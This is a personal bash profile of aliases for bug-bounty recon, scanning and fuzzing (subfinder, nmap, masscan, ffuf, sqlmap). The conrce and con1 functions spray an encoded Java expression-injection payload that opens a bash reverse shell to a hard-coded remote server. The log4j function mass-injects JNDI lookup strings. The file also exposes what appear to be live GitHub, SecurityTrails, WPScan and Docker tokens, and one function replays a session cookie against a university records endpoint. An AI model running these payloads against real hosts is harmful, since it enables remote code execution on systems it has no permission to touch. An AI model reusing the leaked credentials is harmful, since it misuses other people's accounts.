#!/bin/bash

whall(){
    for i in $(cat $2); do python3 ~/tools/tools/who.py "$1" $i; sleep 2; done
}
wh(){
    whois $1 | grep -iE 'Organization|Email'
}
gall(){
    find . -type f -name $1 | xargs -n1 -I{} cat {} | sort -u
}
arg(){
    cat $1 | awk '{print $NF"   "$1" "$(NF-1)}' | tr -d '[]' | sort -u | sort -n > sorted
    uniqurls.py $1 | sort -u | sort -n > uniq
}

see-buckets(){
    for i in $(cat $1 | cut -d '.' -f 1);do echo --; echo $i;aws s3 ls s3://$i;done
}
one(){
    sudo airmon-ng start wlo1
}
notone(){
    sudo airmon-ng stop wlo1mon
}
see(){
    ls -s -S -k -h --color | vi -
}
resolvers(){
    #dnsvalidator -tL https://public-dns.info/nameservers.txt -threads 20 -o resolvers.txt
    cd ~/tools/tools/files/
    rm resolvers.txt
    wget https://raw.githubusercontent.com/proabiral/Fresh-Resolvers/master/resolvers.txt
    cd -
}
tekken(){
    wine ~/test/Tekken_3.exe & exit
}
conn(){
    ping www.google.com
}
js(){
    grep -i -E "admin|auth|api|jenkins|corp|dev|stag|stg|prod|sandbox|swagger|aws|azure|uat|test|vpn|cms|token|credentials|user|password|key|email|" $1
}
g(){
    grep -Hanir "$1" | vim -
}
srcprofile(){
	source ~/tools/.bash_profile
}
edpro(){
	vim ~/tools/.bash_profile
}
burp(){
	cd '/home/rocky/tools/burp/Burp Suite Professional Edition v2022.9.5'
    java -noverify --add-opens=java.desktop/javax.swing=ALL-UNNAMED --add-opens=java.base/java.lang=ALL-UNNAMED -javaagent:Dr-FarFar.jar -jar burpsuite_pro_v2022.9.5.jar & exit
}
getroot(){
	cat $1 | rev | cut -d "." -f 1,2 | rev | sort -u | tee -a root-$1
}
getintresting(){
		cat $1 | grep -aiE 'uat|test|prod|admin|stag|jenkins|jankins|jire|jira|smal|auth|outh|corp|api|v1|test' | tee -a potential-$1
}
server(){
    sudo python3 -m http.server $1
}
bruteable(){
    bruteable.py $1 | rev | cut -d "." -f 1,2,3,4 | rev | sort -u
}
#-----------------------subdomain-discovery-------------------------
crtsh(){
	python3 ~/tools/tools/crtsh.py "$1"
}
domains(){
	python3 ~/tools/tools/domains.py "$1"
}
subfind(){
	cat $1 | xargs -n1 -P4 -I{} subfinder -silent -d {}
}
sublist(){
	cat $1 | xargs -n1 -I{} sublist3r -n -d {}
}
brutelist(){
    cat $1 | xargs -n1 -P4 -I{} shuffledns -w ~/tools/SecLists/Discovery/DNS/dns-Rocky.txt -d {} -silent -r ~/tools/tools/files/resolvers.txt
}
brute(){
    cat $1 | xargs -n1 -I{} sh -c "cat $2 | grep {}$ | shuffledns -d {} -r ~/tools/tools/files/resolvers.txt -silent" | tee -a $3
}
bruteall(){
	for i in $(cat $1)
	do
		shuffledns -w $2 -d $i -silent -r ~/tools/tools/files/resolvers.txt -strict-wildcard
	done
}

crtshnahamsec(){
	curl -s https://crt.sh/?Identity=%.$1 | grep ">*.$1" | sed 's/<[/]*[TB][DR]>/\n/g' | grep -vE "<|^[\*]*[\.]*$1" | sort -u | awk 'NF'
}
aqua(){
	cat $1 | ~/tools/aquatone/aquatone -out aquatone/
}

#-----------------port-snanning--------------------------------------
nm(){
	sudo nmap -T4 -Pn -v -sV -sC $1
}
nms(){
	sudo nmap -T4 --script=http-title -v -Pn -oN nmap-$1 $1
}
nma(){
	sudo nmap -Pn -T4 -v -A $1
}
nmall(){
	sudo nmap -T4 --script=http-title -v -Pn -iL $1 -oN $2
}
nmp(){
    sudo nmap -sC -sV -T4 -Pn -p $1 -v $2
}
mscan(){
	sudo masscan -p0-65535 $1 --rate=200 --open
}
msall(){
	sudo masscan -p0-65535 -iL $1 --rate=1500 --open -oG masscan-all-$1
}
mslist(){
	sudo masscan -p2075,2076,6443,3868,3366,8443,8080,9443,9091,3000,8000,5900,8081,6000,10000,8181,3306,5000,4000,8888,5432,15672,9999,161,4044,7077,4040,9000,8089,443,7447,7080,8880,8983,5673,7443,19000,19080 --rate=10000 --open -iL $1 -oG masscan-$1
}
mstop(){
	sudo masscan -p1-1000,2075,2076,6443,3868,3366,8443,8080,9443,9091,3000,8000,5900,8081,6000,10000,8181,3306,5000,4000,8888,5432,15672,9999,161,4044,7077,4040,9000,8089,443,7447,7080,8880,8983,5673,7443,19000,19080 --rate=10000 --open -iL $1 -oG masscan-top-$1

}

#---------------------content-discovery------------------------------
dirsearch(){
	python3 ~/tools/dirsearch/dirsearch.py -w ~/tools/tools/files/dict.txt -u $1 -t 200 -e $2 -H 'X-Forwarded-For: 127.0.0.1' $3 $4 $5 $6
}
dlist(){
	python3 ~/tools/dirsearch/dirsearch.py -r -u $1 -w $2 -H 'X-Forwarded-For:127.0.0.1' -e $3 -t 200 $4 $5 $6 $7
}
wayback(){
	echo $1 | waybackurls
}
waybackall(){
	for i in $(cat $1)
	do
		echo $i | waybackurls
	done
}

#-----------------------recon---------------------------------------
recon(){
    for i in $(cat $1)
    do
        subdomains $i
    done | anew domains
}
probe(){
    cat $1 | httpx -silent
}
urls(){
    gauplus $1 > $1
    cat $1
}
apis(){
    grep -Hnro -E 'AIza[0-9A-Za-z_-]{35}|AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}|EAACEdEose0cBA[0-9A-Za-z]+'
}
rlist(){
    cat $1 | xargs -n1 -P4 -I{} recon.py {}
}
am(){
    cat $1 | xargs -P4 -n1 -I{} amass enum -passive -nocolor -nolocaldb -config ~/tools/amass/config.ini -d {}
}
param(){
    x8 -u $1 -w ~/tools/tools/files/parameters.txt $2 $3 
}
fuzz(){
    ffuf -u $1 -w ~/tools/tools/files/fdict.txt -t 200 -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0' -H "X-Forwarded-For: 127.0.0.1" -ac -mc all -c $2 $3 $4 $5 $6 $7 $8 $9 
}
ff(){
    ffuf -u $1 -w ~/tools/tools/files/dicc.txt -t 200 -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0' -H "X-Forwarded-For: 127.0.0.1" -ac -mc all -c $2 $3 $4 $5 $6 $7 $8 $9 
}
fuzzw(){
    ffuf -u $1 -w $2 -t 200 -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0' -H "X-Forwarded-For: 127.0.0.1" -ac -mc all -c $3 $4 $5 $6 $7 $8 $9 
}
beautifyall(){
    ls | xargs -n1 -I{} -P4 sh -c "beautify.py {}"
}
new(){
    for i in $(cat root)
    do
        amass enum -passive -nocolor -nolocaldb -config ~/tools/amass/config.ini -d $i
        subfinder -silent -d $i
        recon.py $i
        findomain -q -t $i
        sublist3r -n -d $i
    done | anew domains | tee -a new | dnsx -silent -o active-new
}
netData(){
    cat $1 | awk '{print $1}' | grep AS | sed 's/AS//g' > asn
    cat $1 | awk '{print $1}' | grep -v AS | grep '\.' > cidr
}
findd(){
    cat $1 | xargs -n1 -I{} -P4 sh -c "findomain -q -t {}"
}
subdomains(){
  #  amass enum -passive -nocolor -nolocaldb -config ~/tools/amass/config.ini -d $1
    subfinder -silent -d $1
    recon.py $1
    findomain -q -t $1
    github-subdomains -d $1 -t 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,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 -raw
    rm $1.txt
    stdoms $1
}
certspotter(){
    curl -s https://certspotter.com/api/v0/certs\?domain\=$1 | jq '.[].dns_names[]' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u | grep $1
}
enum(){
    #get alive
    cat domains | dnsx -resp -o resp -silent
    cat resp | awk '{print $1}' | sort -u | anew dns
    cat resp | awk '{print $2}' | tr -d '[]' | sort -u > ips
    clean_ips.py ips | anew ip_addresses

    #get data on active domains
    mkdir out
    cat dns | httpx -status-code -content-length -title -no-color -fr -silent -location -td -t 100 -o out/index
    
    #get active-domains
    cat out/index | awk '{print $1}' | sort -u > active-domains
}
struds(){
    cat $1 | httpx -path '/sm/login/loginpagecontentgrabber.do' -threads 100 -random-agent -x GET -title -tech-detect -status-code  -follow-redirects -title -mc 200 -no-color -content-length -o $2 
}
a(){
    amass enum -passive -nocolor -nolocaldb -config ~/tools/amass/config.ini -d $1
}
msd(){
    ./bin/massdns -r resolvers.txt -t A -o J subdomains.txt | jq 'select(.resp_type=="A") | .query_name' | sort -
}
sjack(){
    subjack -w $1 -t 100 -timeout 30 -c ~/tools/subjack/fingerprints.json -ssl
}
reconpad(){
    ssh -i "~/tools/server/servers.pem" ubuntu@20.193.131.101
}
checkey(){
    cat ~/bounty/maps-urls | sed "s/KEY_HERE/$1/g"
}
sdns(){
    shuffledns -d $1 -w $2 -r ~/tools/tools/files/resolvers.txt -strict-wildcard -silent
}
sendr(){
    scp -i "~/tools/server/servers.pem" $1 ubuntu@20.193.131.101:/home/ubuntu/$2
}
recvr(){
    scp -i "~/tools/server/servers.pem" ubuntu@20.193.131.101:/home/ubuntu/$1 $2
}
fp(){
    find . -name $1 | xargs -n1 -I{} cat {} | sort -u
}
pscan(){ 
	sudo nmap -T4 -sC -v -Pn -iL $1 -oN nmap-$1
	sudo masscan -p0-65535 -iL $2 --rate=700 --open -oG masscan-all-$2
}
portswigger(){
    echo '6#iEZ6|jkPM^]Gn638fJ98NHatJ[C~GA'

}
rem(){
    for i in $(ls)
    do
        python3 ~/test/tools/filter/rem.py $i >> t
    done
}
xss(){
    if [ $# != 2 ]
    then
        echo "need two arguments"
    else
        cat $1 | grep -a '=' | grep -vaE "\.(gif|jpeg|css|tif|tiff|png|woff|jpg|ico|pdf|svg|txt|js)" | kxss | tee -a $2 
    fi
}
sqli(){
    python3 ~/tools/sqlmap/sqlmap.py -m $1 --dbs --batch --risk 3
}
fuzzer(){
    ssh -i "~/tools/server/servers.pem" ubuntu@20.197.53.241
}
sendf(){
     scp -i "~/tools/server/servers.pem" $1 ubuntu@20.197.53.241:/home/ubuntu/$2
}
recvf(){
    scp -i "~/tools/server/servers.pem" ubuntu@20.197.53.241:/home/ubuntu/$1 $2
}
dork-root(){
    echo -n site:*.;join.py $1 | sed 's/,/ | site:*./g'
}
whm(){
    sudo python3 ~/tools/tools/whois-man.py $1 $2
}
sqlm(){
    python3 ~/tools/sqlmap/sqlmap.py -u $1 --risk 3 --dbs --batch $2 $3 $4 $5
}
sqlmf(){
    python3 ~/tools/sqlmap/sqlmap.py -r $1 --risk 3 --dbs --batch $2 $3 $4 $5 $6 $7 $8 $9
}
bounty(){
    ssh -i "~/tools/server/servers.pem" ubuntu@45.126.126.68
}
sendb(){
    scp -i "~/tools/server/servers.pem" $1 ubuntu@45.126.126.68:/home/ubuntu/$2
}
recvb(){
    scp -i "~/tools/server/servers.pem" ubuntu@45.126.126.68:/home/ubuntu/$1 $2
}
asn(){
    curl -s "http://asnlookup.com/api/lookup?org=$1" | jq -r '.[]'
}
scanner(){
    ssh -i "~/tools/server/servers.pem" ubuntu@20.197.55.146
}
sends(){
    scp -i "~/tools/server/servers.pem" $1 ubuntu@20.197.55.146:/home/ubuntu/$2
}
recvs(){
    scp -i "~/tools/server/servers.pem" ubuntu@20.197.55.146:/home/ubuntu/$1 $2
}
hx(){
    cat $1 | httpx -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0' -fr -sc -nc -title -cl -location -silent -t 100 -td $2 $3 $4 $5 $6 $7 $8 $9 
}
ver(){
    cd /home/rocky/recondata/verizonmedia/main/03-10-21
}
wps(){
    wpscan --url $1 --api-token 8GcfjAzhd9MApKYaAHNHDJHnJzpCKTHxaNrrvy99dmI
}
sort-index(){
    cat $1 | awk '{print $NF"  "$1"  "$(NF-1)}' | tr -d '[]' | sort -u | sort -n
}
roos(){
    join.py $1 | sed 's/,/|/g' | xargs -n1 -I{} sh -c "cat $2 | grep -avE '^({})$'"
}
u(){
    sudo apt -y update && sudo apt -y upgrade
}
wifix(){
    sudo rmmod mt76x0e
    sudo modprobe mt76x0e
}
log4j(){
    cat $1 | grep = | qsreplace '${jndi:ldap://x${hostName}.L4J.tl6jvby071gpq088dac5st2mh.canarytokens.com/a}' | grep -vE 'www|join|invite|==' | urldedupe -s | httpx
}
devpad(){
    ssh -i "~/tools/server/servers.pem" ubuntu@114.29.238.23
}
sendd(){
    scp -i "~/tools/server/servers.pem" $1 ubuntu@114.29.238.23:/home/ubuntu/$2
}
recvd(){
    scp -i "~/tools/server/servers.pem" ubuntu@114.29.238.23:/home/ubuntu/$1 $2
}
sendall(){
    echo 'reconpad'
    scp -i "~/tools/server/servers.pem" $1 ubuntu@20.193.131.101:/home/ubuntu/$2
    echo 'fuzzer'
    scp -i "~/tools/server/servers.pem" $1 ubuntu@20.197.53.241:/home/ubuntu/$2
    echo 'scanner'
    scp -i "~/tools/server/servers.pem" $1 ubuntu@20.197.55.146:/home/ubuntu/$2
    echo 'bounty'
    scp -i "~/tools/server/servers.pem" $1 ubuntu@45.126.126.68:/home/ubuntu/$2
    echo 'devpad'
    scp -i "~/tools/server/servers.pem" $1 ubuntu@114.29.238.23:/home/ubuntu/$2
}
sendallr(){
    echo 'reconpad'
    scp -i "~/tools/server/servers.pem" -r $1 ubuntu@20.193.131.101:/home/ubuntu/$2
    echo 'fuzzer'
    scp -i "~/tools/server/servers.pem" -r $1 ubuntu@20.197.53.241:/home/ubuntu/$2
    echo 'scanner'
    scp -i "~/tools/server/servers.pem" -r $1 ubuntu@20.197.55.146:/home/ubuntu/$2
    echo 'bounty'
    scp -i "~/tools/server/servers.pem" -r $1 ubuntu@45.126.126.68:/home/ubuntu/$2
    echo 'devpad'
    scp -i "~/tools/server/servers.pem" -r $1 ubuntu@114.29.238.23:/home/ubuntu/$2
}

c(){
    curl -i -k --path-as-is $1 $2 $3 $4 $5 $6
}

work(){
    export PS1='\[\033[01;34m\]\n-(\[\033[01;31m\]rocky@dir\[\033[01;34m\])\[\033[01;31m\]~\[\033[01;34m\][\[\033[01;00m\]~\[\033[01;34m\]]\n\[\033[01;34m\] ~\[\033[01;31m\]$ \[\033[01;00m\]'
}
runcode(){
    export PS1='\[\033[01;32m\]\n-(\[\033[01;34m\]rocky@run\[\033[01;32m\])\[\033[01;34m\]~\[\033[01;32m\][\[\033[01;00m\]~\[\033[01;32m\]]\[\033[01;32m\] ~\[\033[01;34m\]$ \[\033[01;00m\]'
}
vu(){
    cat $1 | grep -a '\[200\]' | awk '{print $4" "$1}' | tr -d '[]' | python3 ~/test/tools/filter/uniq2.py - | sort -n
}
vr(){
    cat $1 | grep -aE '\[\/\/www.google.com\/re|\[\/\/\/www.google.com\/re|\[\/\/\/\/www.google.com\/re'
}
mdns(){
    massdns -r ~/tools/tools/files/resolvers.txt -t A -o S -w massdns-$1.out $1
}
alts(){
    ripgen -d $1 -w ~/tools/dnsgen/dnsgen/words.txt
}
uu(){
    cat $1 | grep -aE "$2" | awk '{gsub("\[", "", $4);gsub("\]", "", $4);print $4" "$0}' | uniq2.py - | sort -n 
}
uhp(){
    cat $1 | awk '{gsub("\\[", "", $4);gsub("\\]", "", $4);print $4"    "$0}' 
}
uhp3(){
    cat $1 | awk '{gsub("\[", "", $3);gsub("\]", "", $3);print $3"  "$0}' 
}
uhp2(){
    cat $1 | awk '{gsub("\[", "", $2);gsub("\]", "", $2);print $2"  "$0}' 
}
cache(){
    grep -Hnir 'x-cache' | awk -F ':' '{print $1}' | sort -u  | httpx -H 'X-Forwarded-Host: test123' -ms test123 -t 200
}
m2h(){
    masscan2http.py $1 | httpx -silent -no-color -title -status-code -content-length
}
grafana-tr(){
    echo $1 | httpx -silent -sc -cl -title -path ~/tools/tools/files/grafana-pt
}
domxss(){
    grep -Hnir -E "addEventListener\((?:'|\")message(?:'|\")" | awk -F '_' '{print $1}' | httpx -sc -cl
}
n(){
    gedit ~/notes & exit
}
ser(){
    gedit ~/servers & exit
}
d5(){
    cd /media/rocky/24193e18-fd91-4da1-b89e-dafdfc04ab2b/
}
ama(){
    cat $1 | xargs -n1 -I{} sh -c "amass enum -active -trf ~/tools/tools/files/resolvers.txt -tr 8.8.8.8 -config ~/tools/amass/config.ini -o {}.out -d {}"
}
sbrc(){
    source ~/.bashrc
}
ebrc(){
    vi ~/.bashrc
}
zap(){
    java -jar ~/ZAP/zap-2.11.1.jar & exit
}
sd(){
    cat targets-data.txt | grep -aE $1 | awk -F ',' '{print $1}' | xargs -n1 -I{} sh -c "cat http-result | grep -a {}" 
}
conrce(){
    cat $1 | httpx -sc -cl -nc -path '/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/20.193.131.101/1270%200%3E%261%27%29.start%28%29%22%29%7D/'
}
con1(){
    echo $1 | httpx -sc -cl -nc -path '/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/20.193.131.101/1270%200%3E%261%27%29.start%28%29%22%29%7D/'
}
autowhois(){
    cat $2 | xargs -n1 -I{} sh -c "whois {} | grep -aiE $1>/dev/null && echo {};sleep 1"
}
xnlf(){
    python3 ~/tools/xnLinkFinder/xnLinkFinder.py -p 50 -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0' -i $1 -o cli -d 3 | sed "s/^\//$1\//g"
}
xnall(){
    python3 ~/tools/xnLinkFinder/xnLinkFinder.py -p 50 -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0' -i $1 -o cli -d 3 | sed "s/^\//$1\//g"
}
fall(){
    xargs -P `nproc` -I {} sh -c 'url="{}"; ffuf -mc all -H "X-Forwarded-For: 127.0.0.1" -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0" -u "{}/FUZZ" -w ~/tools/tools/files/dict.txt -t 200 -ac -se -o fuzz/${url##*/}-${url%%:*}.json' < $1
    cat fuzz/* | jq '[.results[]|{status: .status, length: .length, url: .url}]' | grep -oP "status\":\s(\d{3})|length\":\s(\d{1,7})|url\":\s\"(http[s]?:\/\/.*?)\"" | paste -d' ' - - - | awk '{print $2" "$4" "$6}' | sed 's/\"//g' > result.txt

    cat result.txt | awk '{print $1" ["$2"] "$3" "$4" "$5}' > r
    guniq 1 r | sort -n > uniq-result.txt
    rm r
}
sqltest()
{
    cat $1 | grep -vE 'Cloudflare|Akamai|Apache|Error|www|Nginx|Cloudfront|IIS|400|50[0-9]|\[0\]|Access'
}
srf(){
    sendf root recon/
    sendf out-of-scope recon/
}
ssrf(){
    cat $1 | grep -aiE 'host\=|redirect\=|uri\=|path\=|continue\=|url\=|window\=|next\=|data\=|image-source\=|n\=|to\=|follow\=|u\=|go\=|fetch\=|source\=|img\-src\='
}
vhost(){
    ffuf -u $1 -H "Host: FUZZ.$2" -t 200 -c -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0" -H "X-Forwarded-For: 127.0.0.1" -w ~/tools/tools/files/best-dns-wordlist.txt -ac -mc all
}
vhostall(){
    xargs -P `nproc` -I {} sh -c 'url="{}"; ffuf -mc all -H "Host: FUZZ" -H "X-Forwarded-For: 127.0.0.1" -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0" -u "{}/" -w ./domains -t 200 -ac -se -o fuzz/${url##*/}-${url%%:*}.json' < $1
    cat fuzz/* | jq '[.results[]|{status: .status, length: .length, url: .url}]' | grep -oP "status\":\s(\d{3})|length\":\s(\d{1,7})|url\":\s\"(http[s]?:\/\/.*?)\"" | paste -d' ' - - - | awk '{print $2" "$4" "$6}' | sed 's/\"//g' > result.txt

    cat result.txt | awk '{print $1" ["$2"] "$3" "$4" "$5}' > r
    guniq 1 r | sort -n > uniq-result.txt
    rm r

}
countd(){
    cat root | xargs -n1 -I{} sh -c "echo {};echo '';cat out/index | grep -aiE '\.{}';echo '';echo '--------------------------------------------------------------------------'"
}
crawl()
{
    echo $1 | hakrawler | httpx -silent -http-proxy http://127.0.0.1:8080
}
scan-takeovers()
{
    while :
    do  
        for i in $(ls | grep -aE '^x')
        do 
            SubOver -t 200 -timeout 10 -l $i
        done | sed 's/\x1B\[[0-9;]\{1,\}[A-Za-z]//g' | anew takeovers.txt | notify.py
        sleep 10800
    done
}
vs(){
    code . && exit
}
bruted(){
     mkdir output
     for i in $(cat $1)
     do
     mkdir output/$i
     for j in $(ls ~/tools/tools/files/brute/);
     do
            puredns bruteforce -r ~/tools/tools/files/resolvers.txt -w output/$i/$j.out ~/tools/tools/files/brute/$j $i
     done
     cat output/$i/* | sort -u > output/$i.dns
     rm -rf /output/$i
     done
}
perm(){
    gotator -sub $1 -perm ~/tools/dnsgen/dnsgen/words.txt -depth 2 -numbers 5 -silent
}
resv(){
    puredns resolve -r ~/tools/tools/files/resolvers.txt -w $1.out $1
}
dt(){
    pwd | cut -d '/' -f5 | xargs -n1 -I{} sh -c "scp -i \"~/tools/server/servers.pem\" ubuntu@20.197.53.241:/home/ubuntu/{}.tar.gz . && tar -xzf {}.tar.gz"
}
ufr(){
    cat result.txt | awk '{print $1" ["$2"] "$3" "$4" "$5}' > r
    guniq 1 r | sort -n > uniq-result.txt
    rm r
}
components(){
    mkdir components
    mkdir components/$1 components/$2 components/$3
    touch components/$1/$1.jsx components/$2/$2.jsx components/$3/$3.jsx
    touch components/$1/$1.css components/$2/$2.css components/$3/$3.css
}
gu(){
    gutest1 $1 | sort -u
}
gutest1(){
    gauplus $1 &
    waybackurls $1
}
ghs()
{
    for i in $(cat $1)
    do
        github-subdomains -d $i -t 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,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 -raw
    done
}
getresult()
{
    paperid=$(curl -s -k -X $'POST'     -H $'Host: student.gehu.ac.in' -H $'Content-Length: 21' -H $'Accept: */*' -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'     -b $'ASP.NET_SessionId=saaajgjgbucutv4a3hohqj12'     --data-binary $'yearSem=2&Regid=62018'     $'https://student.gehu.ac.in/Web_StudentAcademic/FillMarksheet' | jq .docNo | sed 's/"//g')
    echo "https://student.gehu.ac.in/Web_StudentAcademic/DownloadFile?docNo=$paperid"
}
gitp()
{
    git add .
    git commit -m "Uploaded files"
    git push
}
crepo()
{
    gh repo create $1  --public $2 $3 $4
    git clone git@github.com:r0ckYr/$1.git
}
drepo()
{
    gh repo delete $1
    rm -rf $1
}
dloing()
{
    docker login -u r0ckyr
    #dckr_pat_VuV7ZuClkm5uIhjAhGV8CBMp6Xg
}
dokpush()
{
    sudo docker tag $1 r0ckyr/$1
    sudo docker push r0ckyr/$1
}
stdoms()
{
    curl "https://api.securitytrails.com/v1/domain/$1/subdomains" -H 'apikey: euS5lVzNd8wKLH184k9qkFapdE1L0J46' |  jq -r .subdomains[] | sed -e s/$/.$1/g
    #curl "https://api.securitytrails.com/v1/domain/$1/subdomains" -H 'apikey: E8YCQgYsqEPQl3xZVHaDYFWcTrlOskXl' |  jq -r .subdomains[] | sed -e s/$/.$1/g
}
stenum()
{
    stdoms $1 | tee -a $1.com | httpx -sc -cl -title -nc -td -location -fr -t 100 -o $1.out
}

hx()
{
    cat $1 | httpx -cl -location -fr -sc -td -silent -title -nc -t 100 -H 'X-Forwarded-For: 127.0.0.1' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.63 Safari/537.36'
}
tover()
{
    cd ~/tools/SubOver
    SubOver -l $1
    cd -
}
vhostF()
{
    VhostFinder -ips $2 -wordlist $1 -H 'X-Forwarded-For: 127.0.0.1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0' -t 200 | tee -a $3
}
lat()
{
    ls | rev | sort -n | rev
}
gettitles(){
    cat $1 | cut -d '[' -f5 | tr -d ']$' | sort -u
}
cai()
{
    caido & exit
}
extract_emails()
{
    grep -E -osrwh "[[:alnum:]._%+-]+@[[:alnum:]]+\.[a-zA-Z]{2,6}" & grep -hnir -E -o '\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b'
}
wp()
{
    wpscan --url $1 --api-token a0qnZXUsMnptRAgmQip0sEbCPog0fRX0XnaHAKcuMT0wp
}
kcai()
{
    ps aux | grep caido | head -n 1 | awk '{print $2}' | xargs -I{} kill {}
}
sr()
{
    mkdir $1
    cd $1
    subdomains $1 | sort -u > domains
    hx domains > index
    cat index
}
dor()
{
    recon $1
    enum
}
gob()
{
    go build $1.go
    cp $1 ../bin/
}
gq()
{
    guniq 3 $1 | sort -n > uniq
}
atos()
{
    echo $1 | anew ~/tools/tools/files/secret-files
}
not()
{
    history | tail -n2 | head -n1 | sed 's/[0-9]* //' | xargs -I{} echo "Done : {}" | notify.py
}
